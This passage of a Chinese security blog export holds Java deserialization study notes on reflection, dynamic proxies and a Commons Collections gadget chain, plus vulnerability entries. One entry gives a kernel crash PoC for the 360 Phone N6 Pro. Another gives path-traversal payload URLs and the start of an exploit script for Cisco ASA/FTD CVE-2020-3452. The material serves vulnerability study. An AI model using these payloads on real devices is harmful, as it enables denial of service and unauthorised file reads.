&#123;</span><br><span class="line">			e.printStackTrace();</span><br><span class="line">		&#125;catch (IOException e) &#123;</span><br><span class="line">			&#x2F;&#x2F; TODO: handle exception</span><br><span class="line">			e.printStackTrace();</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	public static void deser() &#123;</span><br><span class="line">		&#x2F;&#x2F;反序列化，读取操作</span><br><span class="line">		try &#123;</span><br><span class="line">			ObjectInputStream iiStream &#x3D; new ObjectInputStream(new FileInputStream(&quot;object.obj&quot;));</span><br><span class="line">			Object xObject &#x3D; iiStream.readObject();</span><br><span class="line">			System.out.println(xObject);</span><br><span class="line">			iiStream.close();</span><br><span class="line">		&#125; catch (FileNotFoundException e) &#123;</span><br><span class="line">			&#x2F;&#x2F; TODO: handle exception</span><br><span class="line">			e.printStackTrace();</span><br><span class="line">		&#125;catch (IOException e) &#123;</span><br><span class="line">			&#x2F;&#x2F; TODO: handle exception</span><br><span class="line">			e.printStackTrace();</span><br><span class="line">		&#125; catch (ClassNotFoundException e) &#123;</span><br><span class="line">			&#x2F;&#x2F; TODO Auto-generated catch block</span><br><span class="line">			e.printStackTrace();</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>





<p>执行结果：</p>
<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/getImage-20200913014329684.png" alt="img"></p>
<h3 id="0x3、通过setAccessible访问私有属性和函数"><a href="#0x3、通过setAccessible访问私有属性和函数" class="headerlink" title="0x3、通过setAccessible访问私有属性和函数"></a>0x3、通过setAccessible访问私有属性和函数</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">﻿package 反序列化2;</span><br><span class="line"></span><br><span class="line">import java.lang.reflect.Constructor;</span><br><span class="line">import java.lang.reflect.Method;</span><br><span class="line">&#x2F;*</span><br><span class="line"> * 测试setAccessible方法，可以通过将它设置为true--setAccessible(true) 来访问private属性和函数。</span><br><span class="line"> * 而且可以提高程序的执行效率，因为减少了安全检查。</span><br><span class="line"> *&#x2F;</span><br><span class="line">public class reflectionTest3 &#123;</span><br><span class="line"></span><br><span class="line">    public static void main(String[] args)&#123;</span><br><span class="line">        try &#123;</span><br><span class="line">            String path &#x3D; &quot;反序列化2.User3&quot;; </span><br><span class="line">            Class clazz &#x3D; Class.forName(path);</span><br><span class="line"></span><br><span class="line">            &#x2F;&#x2F;Method method &#x3D; clazz.getMethod(&quot;setName&quot;,String.class);</span><br><span class="line">            &#x2F;&#x2F;getMethod只能获取public的方法，private的方法需要使用getDeclaredMethod来获取，并且设置setAccessible(true)才可以调用访问。</span><br><span class="line">            &#x2F;&#x2F;参数属性也是一样。</span><br><span class="line">            Method method &#x3D; clazz.getDeclaredMethod(&quot;setName&quot;, String.class);</span><br><span class="line">            method.setAccessible(true);</span><br><span class="line"></span><br><span class="line">            &#x2F;&#x2F;Constructor strut &#x3D; clazz.getConstructor(String.class,Integer.class);</span><br><span class="line">            &#x2F;&#x2F;getConstructor只能获取public的构造方法</span><br><span class="line">            Constructor strut &#x3D; clazz.getDeclaredConstructor(String.class,Integer.class);</span><br><span class="line">            strut.setAccessible(true);</span><br><span class="line">            User3 user &#x3D; (User3)strut.newInstance(&quot;bit4&quot;,19);</span><br><span class="line">            &#x2F;&#x2F;调用自定义构造器的方法</span><br><span class="line">            Object x &#x3D; method.invoke(user,&quot;比特&quot;);&#x2F;&#x2F;第一个参数是类的对象。第二参数是函数的参数</span><br><span class="line">            System.out.println(user.getName());</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        &#125; catch (Exception e1) &#123;</span><br><span class="line">            e1.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class User3&#123;</span><br><span class="line"></span><br><span class="line">    private Integer age;</span><br><span class="line">    private String name;</span><br><span class="line"></span><br><span class="line">    private User3() &#123;&#125;</span><br><span class="line"></span><br><span class="line">    private User3(String name,Integer age)&#123; &#x2F;&#x2F;构造函数，初始化时执行</span><br><span class="line">        this.age &#x3D; age;</span><br><span class="line">        this.name &#x3D; name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    private Integer getAge() &#123;</span><br><span class="line">        return age;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    private void setAge(Integer age) &#123;</span><br><span class="line">        this.age &#x3D; age;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public String getName() &#123;</span><br><span class="line">        return name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    private void setName(String name) &#123;</span><br><span class="line">        this.name &#x3D; name;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/getImage-20200913014328752.png" alt="img"></p>
<h3 id="0x4、思考总结"><a href="#0x4、思考总结" class="headerlink" title="0x4、思考总结"></a>0x4、思考总结</h3><p>程序的两大根本：变量与函数</p>
<p><em>所以总的来说，要想控制程序实现命令执行，有2个方向</em>：</p>
<p>1.控制代码、函数：就像命名注入等注入类漏洞一样数据被当作了代码执行；或者和上面的demo代码一样重写readObject，加入自定义的代码（当然这种场景基本不存在，任意文件上传和执行勉强算是属于这种情况）。</p>
<p>2.控制输入、数据、变量：利用代码中已有的函数和逻辑，通过改变输入内容的形态实现流程的控制（不同的输入会走不同的逻辑流程，执行不同代码块中的代码）。</p>
<p><em>对于java反序列化漏洞，属于控制数据输入，它有2个基本点必须要满足</em>：</p>
<p>1.有一个可序列化的类，并且该类是重写了readObject()方法的（由于不存在代码注入，只能查找已有代码逻辑中是否有这样的类）。</p>
<p>2.在重写的readObject()方法的逻辑中有 method.invoke函数出现，而且参数可控。</p>
<p><em>再稍作抽象：</em></p>
<p>1.有一个可序列化的类，并且该类是重写了readObject()方法的，除了默认的对象读取外，还有其他处理逻辑。（主线流程，反序列化漏洞都是这个主线逻辑流程，这是反序列化漏洞的入口点。）</p>
<p>2..在重写的readObject()方法的逻辑中有 直接或间接使用类似method.invoke这种可以执行调用任意方法的函数，而且参数可控。（是否还有其他函数可以达到相同的目的呢？）</p>
<p>Apache Commons Collections 3.x 版本的 Gadget 构造过程 就是典型的例子。它的调用链如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;*</span><br><span class="line">    Gadget chain:</span><br><span class="line">        ObjectInputStream.readObject()</span><br><span class="line">            AnnotationInvocationHandler.readObject()</span><br><span class="line">                AbstractInputCheckedMapDecorator$MapEntry.setValue()</span><br><span class="line">                    TransformedMap.checkSetValue()</span><br><span class="line">                        ConstantTransformer.transform()</span><br><span class="line">                        InvokerTransformer.transform()</span><br><span class="line">                            Method.invoke()</span><br><span class="line">                                Class.getMethod()</span><br><span class="line">                        InvokerTransformer.transform()</span><br><span class="line">                            Method.invoke()</span><br><span class="line">                                Runtime.getRuntime()</span><br><span class="line">                        InvokerTransformer.transform()</span><br><span class="line">                            Method.invoke()</span><br><span class="line">                                Runtime.exec()</span><br><span class="line"></span><br><span class="line">    Requires:</span><br><span class="line">        commons-collections &lt;&#x3D; 3.2.1</span><br><span class="line">*&#x2F;﻿</span><br></pre></td></tr></table></figure>



<p>参考：</p>
<p><a href="http://blog.csdn.net/liujiahan629629/article/details/18013523">http://blog.csdn.net/liujiahan629629/article/details/18013523</a></p>
<p><a href="http://blog.csdn.net/zjf280441589/article/details/50453776">http://blog.csdn.net/zjf280441589/article/details/50453776</a></p>
<p><a href="http://ifeve.com/java-reflection/">http://ifeve.com/java-reflection/</a></p>
<p><a href="http://blog.knownsec.com/2015/12/untrusted-deserialization-exploit-with-java/">Apache Commons Collections 3.x 版本的 Gadget调用链</a><a href="http://blog.knownsec.com/2015/12/untrusted-deserialization-exploit-with-java/">http://blog.knownsec.com/2015/12/untrusted-deserialization-exploit-with-java/</a>)</p>
]]></content>
      <categories>
        <category>WEB安全</category>
      </categories>
      <tags>
        <tag>java反序列化</tag>
      </tags>
  </entry>
  <entry>
    <title>Java反序列化漏洞学习实践三-理解java的动态代理机制</title>
    <url>/2020/09/13/WEB/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0%E5%AE%9E%E8%B7%B5%E4%B8%89-%E7%90%86%E8%A7%A3java%E7%9A%84%E5%8A%A8%E6%80%81%E4%BB%A3%E7%90%86%E6%9C%BA%E5%88%B6/</url>
    <content><![CDATA[<h3 id="0x0、基础"><a href="#0x0、基础" class="headerlink" title="0x0、基础"></a><strong>0x0、基础</strong></h3><p>代理的使用场景：某程序员入职公司接手了一个项目，他读源码发现某些地方可以增强，比如在某些函数执行前应该打印日志。如果他直接在原始代码的基础上直接修改容易出错，他的做法是：自己实现一个类，和原始类实现相同的接口（或者继承相同的类），通过在方法中引用老程序的方法来实现自己的方法，从而实现在不改动源代码的基础上达到增强方法的目的。</p>
<p>代理模式：为其他对象提供一种代理以便控制对这个对象的访问（所谓控制，就是可以在其调用行为前后分别加入一些操作）。</p>
<p>代理模式分类：</p>
<ol>
<li>静态代理，其实质是类的继承或接口的实现，比较容易理解，注意结合场景。</li>
<li><strong>动态代理（Jdk动态代理），这是我们需要关注的重点，在反序列化漏洞的场景中需要用到！</strong></li>
<li>cglib动态代理</li>
</ol>
<a id="more"></a>

<h3 id="0x1、静态代理demo和理解"><a href="#0x1、静态代理demo和理解" class="headerlink" title="0x1、静态代理demo和理解"></a><strong>0x1、静态代理demo和理解</strong></h3><p>``</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;code&gt;&lt;strong&gt;package 反序列化3;</span><br><span class="line"></span><br><span class="line">&#x2F;*</span><br><span class="line"> * 代理模式的简单demo，静态代理</span><br><span class="line"> * </span><br><span class="line"> * 代理的使用场景：某程序员入职公司接手了一个项目，他读源码发现某些地方可以增强（比如在某些函数执行前应该打印日志）。</span><br><span class="line"> * 如果他直接在原始代码的基础上直接修改容易出错，他的做法是：自己实现一个类，和原始类实现相同的接口（或者继承相同的类），</span><br><span class="line"> * 通过在方法中引用老程序的方法来实现自己的方法，从而实现增强方法的目的。</span><br><span class="line"> *&#x2F;</span><br><span class="line"></span><br><span class="line">public class proxyTest &#123;</span><br><span class="line">	  public static void main(String[] args) &#123;</span><br><span class="line">	        &#x2F;&#x2F;Subject sub &#x3D; new RealSubject();&#x2F;&#x2F;场景中得旧代码，老程序员写的。</span><br><span class="line">	        Subject sub &#x3D; new ProxySubject();&#x2F;&#x2F;新入职的程序员，自己实现了ProxySubject类，然后改成了这句。来增强老程序的代码。</span><br><span class="line">	        sub.request();</span><br><span class="line">	    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">abstract class Subject&#x2F;&#x2F;也可以是接口interface</span><br><span class="line">&#123;&#x2F;&#x2F;抽象角色：通过接口或抽象类声明真实角色实现的业务方法。</span><br><span class="line">    &#x2F;&#x2F;类比网络代理，比如http代理，都支持http协议</span><br><span class="line">    abstract void request();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class RealSubject extends Subject</span><br><span class="line">&#123;&#x2F;&#x2F;真实角色：实现抽象角色，定义真实角色所要实现的业务逻辑，供代理角色调用。</span><br><span class="line">    &#x2F;&#x2F;类比真实的http请求</span><br><span class="line">       public RealSubject()&#x2F;&#x2F;默认构造方法</span><br><span class="line">       &#123;</span><br><span class="line">       &#125;</span><br><span class="line"></span><br><span class="line">       @Override</span><br><span class="line">       public void request()</span><br><span class="line">       &#123;</span><br><span class="line">              System.out.println(&quot;From real subject.&quot;);</span><br><span class="line">       &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class ProxySubject extends Subject&#x2F;&#x2F;关键是类的继承。</span><br><span class="line">&#123;&#x2F;&#x2F;代理角色：实现抽象角色，是真实角色的代理，通过真实角色的业务逻辑方法来实现抽象方法，并可以附加自己的操作。</span><br><span class="line">    &#x2F;&#x2F;类比通过代理发出http请求，这个代理当然可以对http请求做出任何想要的修改。</span><br><span class="line">    private RealSubject realSubject; &#x2F;&#x2F;以真实角色作为代理角色的属性</span><br><span class="line"></span><br><span class="line">       public ProxySubject()</span><br><span class="line">       &#123;</span><br><span class="line">       &#125;</span><br><span class="line"></span><br><span class="line">       @Override</span><br><span class="line">       public void request() &#x2F;&#x2F;该方法封装了真实对象的request方法，老程序员的方法。</span><br><span class="line">       &#123;&#x2F;&#x2F;所谓的“控制”就体现在这里</span><br><span class="line">        preRequest(); </span><br><span class="line">        if( realSubject &#x3D;&#x3D; null )</span><br><span class="line">        &#123;</span><br><span class="line">            realSubject &#x3D; new RealSubject();</span><br><span class="line">        &#125;</span><br><span class="line">        realSubject.request(); &#x2F;&#x2F;此处执行真实对象的request方法</span><br><span class="line">        postRequest();</span><br><span class="line">       &#125;</span><br><span class="line">       private void preRequest()</span><br><span class="line">       &#123;</span><br><span class="line">           &#x2F;&#x2F;在请求前做某些处理，比如打印日志，修改请求包等等</span><br><span class="line">           System.out.println(&quot;Do something before requesting: print log,change request&quot;);</span><br><span class="line">       &#125;</span><br><span class="line"></span><br><span class="line">       private void postRequest()</span><br><span class="line">       &#123;</span><br><span class="line">           &#x2F;&#x2F;在请求后做某些处理，打印日志</span><br><span class="line">           System.out.println(&quot;Do something after requesting: print log&quot;);</span><br><span class="line">       &#125;</span><br><span class="line">   &#125;﻿&lt;&#x2F;strong&gt;&lt;&#x2F;code&gt;</span><br><span class="line">**运行演示：**</span><br></pre></td></tr></table></figure>



<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">**![img](https:&#x2F;&#x2F;leanote.com&#x2F;api&#x2F;file&#x2F;getImage?fileId&#x3D;5f350ee4ab644158a9000a0d)**</span><br></pre></td></tr></table></figure>



<h3 id="0x2、动态代理demo及理解"><a href="#0x2、动态代理demo及理解" class="headerlink" title="0x2、动态代理demo及理解"></a><strong>0x2、动态代理demo及理解</strong></h3><p>但是静态代理这个模式本身有个大问题，如果类方法数量越来越多的时候，代理类的代码量是十分庞大的。比如为老程序员的所有代码都加上日志打印，难道老程序员实现过的所有类，新程序员都需要再实现一遍吗？</p>
<p>所以引入动态代理来解决此类问题。JDK内置的Proxy动态代理可以在运行时动态生成字节码，而没必要针对每个类编写代理类。他只需实现一个InvocationHandler就可以了。</p>
<p>在java的动态代理机制中，有两个重要的类或接口：一个是 InvocationHandler(Interface)；另一个则是 Proxy(Class)，这一个类和接口是实现我们动态代理所必须用到的。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">package 反序列化3;</span><br><span class="line"></span><br><span class="line">import java.lang.reflect.InvocationHandler;</span><br><span class="line">import java.lang.reflect.Method;</span><br><span class="line">import java.lang.reflect.Proxy;</span><br><span class="line"></span><br><span class="line">&#x2F;*</span><br><span class="line"> * 动态代理的简单demo，动态代理利用了反射机制</span><br><span class="line"> * 每一个动态代理类都会有一个与之关联的invocation handler。真正的调用是在invocation handler的invoke()方法里完成的。</span><br><span class="line"> * 感谢蝶离飞、廖新喜2位师傅的指导</span><br><span class="line"> *&#x2F;</span><br><span class="line"></span><br><span class="line">public class proxyTest2&#123;</span><br><span class="line">    public static void main(String[] args) &#123;</span><br><span class="line">        DynamicSubject sub&#x3D;new RealDynamicSubject();&#x2F;&#x2F;之前这里sub的类型是RealDynamicSubject，不对；但是为什么呢？</span><br><span class="line">        Handler handler &#x3D; new Handler(sub);</span><br><span class="line"></span><br><span class="line">        &#x2F;&#x2F;newProxyInstance(ClassLoader loader,Class&lt;?&gt;[] interfaces,InvocationHandler h)</span><br><span class="line">        &#x2F;&#x2F;CLassLoader loader:指定动态代理类的类加载器,即生成完成后的代理对象的类加载器</span><br><span class="line">        &#x2F;&#x2F;Class&lt;?&gt; interfaces:指定动态代理类需要实现的所有接口，需要被增强的接口列表（数据）</span><br><span class="line">        &#x2F;&#x2F;InvocationHandler h: 指定与动态代理类关联的 InvocationHandler对象，具体的增强逻辑</span><br><span class="line"></span><br><span class="line">        DynamicSubject sub2 &#x3D; (DynamicSubject)Proxy.newProxyInstance(DynamicSubject.class.getClassLoader(), new Class[]&#123;DynamicSubject.class&#125;, handler); </span><br><span class="line"></span><br><span class="line">        DynamicSubject sub3 &#x3D; (DynamicSubject)Proxy.newProxyInstance(DynamicSubject.class.getClassLoader(), sub.getClass().getInterfaces(), handler);</span><br><span class="line"></span><br><span class="line">        DynamicSubject sub4 &#x3D; (DynamicSubject)Proxy.newProxyInstance(DynamicSubject.class.getClassLoader(), RealDynamicSubject.class.getInterfaces(), handler);</span><br><span class="line"></span><br><span class="line">        &#x2F;&#x2F;从上面的调用方法可知，可以对不同的对象使用相同的模式实现来实现其代理，这就是相对静态代理的优势。</span><br><span class="line"></span><br><span class="line">        System.out.println(&quot;sub.getClass() &#x3D; &quot;+sub.getClass());</span><br><span class="line">        System.out.println(&quot;DynamicSubject.class &#x3D; &quot; +DynamicSubject.class);</span><br><span class="line">        System.out.println(new Class[]&#123;DynamicSubject.class&#125;);</span><br><span class="line">        System.out.println(RealDynamicSubject.class.getInterfaces());</span><br><span class="line"></span><br><span class="line">        sub2.request();</span><br><span class="line">        sub3.request();</span><br><span class="line">        sub4.request();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">interface DynamicSubject</span><br><span class="line">&#123;&#x2F;&#x2F;抽象角色：通过接口或抽象类声明真实角色实现的业务方法。注意:动态代理只能是接口，否则代理类转成该类型事会报错</span><br><span class="line">    &#x2F;&#x2F;类比网络代理，比如http代理，都支持http协议</span><br><span class="line">    abstract void request();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class RealDynamicSubject implements DynamicSubject</span><br><span class="line">&#123;&#x2F;&#x2F;真实角色：实现抽象角色，定义真实角色所要实现的业务逻辑，供代理handler处理调用。</span><br><span class="line">    &#x2F;&#x2F;类比真实的http请求</span><br><span class="line">       public RealDynamicSubject()</span><br><span class="line">       &#123;</span><br><span class="line">       &#125;</span><br><span class="line"></span><br><span class="line">       public void request()</span><br><span class="line">       &#123;</span><br><span class="line">              System.out.println(&quot;From real subject.&quot;);</span><br><span class="line">       &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#x2F;**</span><br><span class="line"> * 处理器</span><br><span class="line"> *&#x2F;</span><br><span class="line">class Handler implements InvocationHandler&#123;</span><br><span class="line">    private Object obj; &#x2F;&#x2F;被代理的对象（也就是老程序员实现的对象），不管对象是什么类型；之前声明成RealDynamicSubject，不应该这么做</span><br><span class="line">    &#x2F;**</span><br><span class="line">     * 所有的流程控制都在invoke方法中</span><br><span class="line">     * proxy：代理类</span><br><span class="line">     * method：正在调用的方法，反射机制调用函数所必须！</span><br><span class="line">     * args：被调用方法的参数列表，反射机制调用函数所必须！</span><br><span class="line">     *&#x2F;</span><br><span class="line">    @Override</span><br><span class="line">    public Object invoke(Object proxy, Method method, Object[] args) throws Throwable &#123;&#x2F;&#x2F;接口必须实现的方法，也是逻辑核心</span><br><span class="line">        System.out.println(&quot;Do something before requesting: print log&quot;);</span><br><span class="line">        Object xxx &#x3D; method.invoke(this.obj, args);&#x2F;&#x2F;通过反射机制调用老程序员的对象代码。</span><br><span class="line">        System.out.println(&quot;Do something after requesting: print log&quot;);</span><br><span class="line">        return xxx;</span><br><span class="line">    &#125;</span><br><span class="line">    public Handler(Object obj) &#123;</span><br><span class="line">        &#x2F;&#x2F;构造函数，把真实角色的实例传递进来,这个代理handler的目的就是增强它，或者说需要调用它来实现主要的功能。</span><br><span class="line">        this.obj &#x3D; obj;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;﻿</span><br></pre></td></tr></table></figure>





<p>运行结果：</p>
<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/getImage-20200913014358963.png" alt="img"></p>
<h3 id="0x3、思考总结"><a href="#0x3、思考总结" class="headerlink" title="0x3、思考总结"></a>0x3、思考总结</h3><p>在后续将要学习的反序列化PoC构造过程中，我们需要用到这个动态代理机制，因为它提供一种【方法之间的跳转，从任意方法到invoke方法的跳转】，是我们将参数入口和代码执行联系起来的关键！</p>
<p>本文代码下载地址：</p>
<p><a href="https://github.com/bit4woo/Java_deserialize_vuln_lab/tree/master/src/Step3">https://github.com/bit4woo/Java_deserialize_vuln_lab/tree/master/src/Step3</a></p>
<p>参考</p>
<p><a href="http://www.runoob.com/design-pattern/design-pattern-intro.html">http://www.runoob.com/design-pattern/design-pattern-intro.html</a></p>
<p><a href="https://www.cnblogs.com/xiaoluo501395377/p/3383130.html">https://www.cnblogs.com/xiaoluo501395377/p/3383130.html</a></p>
<p><a href="https://www.cnblogs.com/xiaoxi/p/5961093.html">https://www.cnblogs.com/xiaoxi/p/5961093.html</a></p>
]]></content>
      <categories>
        <category>WEB安全</category>
      </categories>
      <tags>
        <tag>java反序列化</tag>
      </tags>
  </entry>
  <entry>
    <title>360 Phone N6 Pro内核漏洞</title>
    <url>/2020/09/12/IOT/Exploit/360/360-Phone-N6-Pro%E5%86%85%E6%A0%B8%E6%BC%8F%E6%B4%9E/</url>
    <content><![CDATA[<h2 id="一、漏洞简介"><a href="#一、漏洞简介" class="headerlink" title="一、漏洞简介"></a>一、漏洞简介</h2><blockquote>
<p>360 Phone N6 Pro V096内核组件中的内核模块允许攻击者使用命令<strong>3235427072</strong>在设备/ dev / block / mmcblk0rpmb上通过ioctl的自变量注入精心设计的自变量，并导致内核崩溃。</p>
</blockquote>
<h2 id="二、漏洞影响"><a href="#二、漏洞影响" class="headerlink" title="二、漏洞影响"></a>二、漏洞影响</h2><ul>
<li>名称：360 Phone N6 Pro</li>
<li>型号：1801-A01</li>
<li>安卓版本：7.1.1</li>
<li>版本号：V096</li>
<li>内核版本：Linux localhost 4.4.21-perf＃1 SMP PREEMPT Wed Mar 28 28 15:24:20 UTC 2018 aarch64</li>
<li><a id="more"></a>

</li>
</ul>
<h2 id="三、复现过程"><a href="#三、复现过程" class="headerlink" title="三、复现过程"></a>三、复现过程</h2><p></p>
<hr>
<h3 id="poc"><a href="#poc" class="headerlink" title="poc"></a>poc</h3><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">* This is poc of 360 N6 Pro, 1801-A01</span></span><br><span class="line"><span class="comment">* Android Version: 7.1.1</span></span><br><span class="line"><span class="comment">* Version Number: V096</span></span><br><span class="line"><span class="comment">* Kernel Version: Linux localhost 4.4.21-perf #1 SMP PREEMPT Wed Mar 28 15:24:20 UTC 2018 aarch64</span></span><br><span class="line"><span class="comment">* A NULL pointer bug in the ioctl interface of device file /dev/block/mmcblk0rpmb causes the system crash via IOCTL 3235427072.</span></span><br><span class="line"><span class="comment">* This Poc should run with permission to do ioctl on /dev/block/mmcblk0rpmb.</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;errno.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="keyword">static</span> <span class="keyword">char</span> *driver = <span class="string">&quot;/dev/block/mmcblk0rpmb&quot;</span>;</span><br><span class="line"><span class="keyword">static</span> command = <span class="number">3235427072</span>; <span class="comment">// 0xc0d8b300</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> **argv, <span class="keyword">char</span> **env)</span> </span>&#123;</span><br><span class="line"><span class="keyword">int</span> fd = <span class="number">0</span>;</span><br><span class="line">fd = open(driver, O_RDWR);</span><br><span class="line"><span class="keyword">if</span> (fd &lt; <span class="number">0</span>) &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Failed to open %s, with errno %dn&quot;</span>, driver, errno);</span><br><span class="line">system(<span class="string">&quot;echo 1 &gt; /data/local/tmp/log&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Try ioctl device file &#x27;%s&#x27;, with command 0x%x and payload NULLn&quot;</span>, driver, command);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;System will crash and reboot.n&quot;</span>);</span><br><span class="line"><span class="keyword">if</span>(ioctl(fd, command, <span class="literal">NULL</span>) &lt; <span class="number">0</span>) &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Allocation of structs failed, %dn&quot;</span>, errno);</span><br><span class="line">system(<span class="string">&quot;echo 2 &gt; /data/local/tmp/log&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br><span class="line">close(fd);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



]]></content>
      <categories>
        <category>IOT</category>
      </categories>
      <tags>
        <tag>IOT</tag>
        <tag>360</tag>
      </tags>
  </entry>
  <entry>
    <title>（CVE-2019-1663）Cisco 堆栈缓冲区溢出漏洞</title>
    <url>/2020/08/06/IOT/Exploit/Cisco/%EF%BC%88CVE-2019-1663%EF%BC%89Cisco%20%E5%A0%86%E6%A0%88%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E/</url>
    <content><![CDATA[<h2 id><a href="#" class="headerlink" title></a></h2>]]></content>
      <categories>
        <category>IOT</category>
      </categories>
      <tags>
        <tag>IOT</tag>
        <tag>Cisco</tag>
      </tags>
  </entry>
  <entry>
    <title>（CVE-2020-3452）Cisco ASAFTD 任意文件读取漏洞</title>
    <url>/2020/09/12/IOT/Exploit/Cisco/%EF%BC%88CVE-2020-3452%EF%BC%89Cisco-ASAFTD-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/</url>
    <content><![CDATA[<h2 id="一、漏洞简介"><a href="#一、漏洞简介" class="headerlink" title="一、漏洞简介"></a>一、漏洞简介</h2><blockquote>
<p>Cisco Adaptive Security Appliance (ASA) 和 Cisco Firepower Threat Defense (FTD) 的 web 服务接口存在漏洞，允许未经身份验证的远程攻击者向受影响的设备发送一个精心制作的HTTP请求，成功利用该漏洞的攻击者能够进行目录遍历攻击并读取目标系统上的敏感文件。</p>
<p>该漏洞目前仅影响启用了AnyConnect或WebVPN配置的设备，并且此漏洞不能用于访问ASA或FTD系统文件或底层操作系统(OS)文件。</p>
</blockquote>
<h2 id="二、漏洞影响"><a href="#二、漏洞影响" class="headerlink" title="二、漏洞影响"></a>二、漏洞影响</h2><p>Cisco ASA：&lt;= 9.6<br>Cisco ASA：9.7 , 9.8 , 9.9 , 9.10 , 9.12 , 9.13 , 9.14<br>Cisco FTD：6.2.2 , 6.2.3 , 6.3.0 , 6.4.0 , 6.5.0 , 6.6.0</p>
<a id="more"></a>

<h2 id="三、复现过程"><a href="#三、复现过程" class="headerlink" title="三、复现过程"></a>三、复现过程</h2><p><strong>payload 1</strong></p>
<blockquote>
<p>/+CSCOT+/translation-table?type=mst&amp;textdomain=/%2bCSCOE%2b/portal_inc.lua&amp;default-language&amp;lang=../</p>
</blockquote>
<p><strong>payload 2</strong></p>
<blockquote>
<p>/+CSCOT+/oem-customization?app=AnyConnect&amp;type=oem&amp;platform=..&amp;resource-type=..&amp;name=%2bCSCOE%2b/portal_inc.lua</p>
</blockquote>
<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20200901164357304.png" alt="image-20200901164357304"></p>
<p>poc</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Exploit Title: Cisco Adaptive Security Appliance Software 9.11 - Local File Inclusion</span></span><br><span class="line"><span class="comment"># Google Dork: inurl:/+CSCOE+/</span></span><br><span class="line"><span class="comment"># Date: 2020-08-27</span></span><br><span class="line"><span class="comment"># Exploit Author:  0xmmnbassel</span></span><br><span class="line"><span class="comment"># Vendor Homepage: https://tools.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-asaftd-ro-path-KJuQhB86</span></span><br><span class="line"><span class="comment"># Version: Cisco ASA Software  &gt;=9.14 except 9.11   Cisco FTD Software &gt;=6.2.2 and 6.2.3,6.3.0,6.4.0,6.50,6.60</span></span><br><span class="line"><span class="comment"># Vulnerability Type: unauthenticated file read</span></span><br><span class="line"><span class="comment"># CVE: CVE-2020-3452</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="built_in">read</span>=<span class="string">&quot;%2bCSCOE%2b/portal_inc.lua&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">helpFunction()</span><br><span class="line">&#123;</span><br><span class="line">   <span class="built_in">echo</span> <span class="string">&quot;&quot;</span></span><br><span class="line">   <span class="built_in">echo</span> -e <span class="string">&quot;\t\tCVE-2020-3452&quot;</span></span><br><span class="line">   <span class="built_in">echo</span> <span class="string">&quot;&quot;</span></span><br><span class="line">   <span 